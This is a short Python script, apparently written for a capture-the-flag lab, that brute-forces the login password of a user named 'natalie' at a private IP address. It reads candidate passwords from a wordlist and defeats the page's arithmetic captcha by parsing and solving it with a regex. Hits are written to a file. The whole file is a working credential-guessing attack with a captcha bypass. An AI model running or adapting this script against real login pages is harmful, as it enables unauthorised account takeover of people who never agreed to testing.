import requests
import re
class Colors:
    RESET= '\033[0m'
    RED = '\033[31m'
    
with open("passwords3.txt", "r") as f:
    lines= f.readlines()
for line in lines:
    stripped_line=line.strip()
    url='http://10.10.59.39/login'
       
    payload={'username':'natalie', 'password': stripped_line}
    
    response= requests.post(url,data=payload)
    #time.sleep(2)
    text=response.text
#print(text)
    match=re.search(r'(\d+)\s*([+\-*\/])\s*(\d+)\s*=', text)
    if match:
        num1=int(match.group(1))
        operator=match.group(2)
        num2=int(match.group(3))
        equation= f"{num1} {operator} {num2}"
        
        if operator == '*':
            result=num1 * num2
        elif operator == '+':
            result=num1 + num2
        elif operator == '-':
            result=num1 - num2
        elif operator == '/':
            result=num1 / num2
        print(f"password : {stripped_line}: captcha: {equation}={result}")
        payload={'username':'natalie', 'password': stripped_line, 'captcha':result}
        response=requests.post(url,data=payload)
        #time.sleep(2)
        second_response=response.text
        does_not_exist_match=re.search(r'Invalid password for user &#39;(\w+)&#39;',second_response)
        
        if does_not_exist_match:

            no_user=does_not_exist_match.group()
            print(f'password {stripped_line} is incorrect!')
        else:
            
            success = open("success.txt", "a")
            print(Colors.RED+"We finally found it! "+ stripped_line + " may be the correct password!"+Colors.RESET)
            success.write(f"\n {stripped_line} is the password ")
            success.close()
    else:
        print("no match")
